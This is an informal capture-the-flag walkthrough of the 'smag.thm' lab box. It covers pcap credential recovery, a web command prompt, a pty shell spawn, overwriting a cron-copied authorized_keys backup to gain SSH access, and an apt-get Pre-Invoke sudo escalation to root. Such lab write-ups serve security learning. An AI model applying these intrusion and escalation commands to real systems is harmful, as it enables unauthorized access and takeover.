ENUMERATION
NOW go for some dirsearch.
we got a directory known as /mail
and there we get a pcap file 

now wget the file and analyze it using wireshark.

FOLOW HTTP STREAM FOR THIS
'''
POST /login.php HTTP/1.1
Host: development.smag.thm
User-Agent: curl/7.47.0
Accept: */*

'''

by this we get a hostname known as  ''development.smag.thm'' now adding this is to my hosts file by '''nano /etc/hosts''' 

After adding it  go to 'development.smag.thm/login.php'  you will get a prompt where u have to login using the creds we got in pcap file '''username=#######&password=######''' .
Now u will get a prompt where u can use some commands.
 do some basic recon on that page.

i just make a spawn shell and the started performing some basic recon on that  '''python3 -c 'import pty; pty.spawn("/bin/bash")'  '''
then i used a command to see the cronjobs for the users 
''' cat /etc/crontabs '''
then i got some output

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command

*  *    * * *   root	/bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys


at last i got there is jake_id_rsa.pub.backup copied for jake and when i see the permisiion of backup file i got hit that i can use it for copying my id to that file and then ssh to jake 	

first we will create a rsa key for jake on our machine by using command 
''' sshkeygen -f jake '''

and put the pub key in backup file.

then use the command on the victim macine as ''' echo 'public id created for jake' > /opt/.backups/jake_id_rsa.pub.backup '''


and after 2-3 minutes when the cronjob start i can able to ssh in jakes machine using
''' ssh -i jake jake@ip  '''


now i got ssh into the machine now cat out the user text.

FOR PRIV ESEC 
we do ''' sudo -l '''

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get

Now after some gtfobins i got a command to gain root shell 
''' sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh '''


and boom i got the root now cat the cat flag.
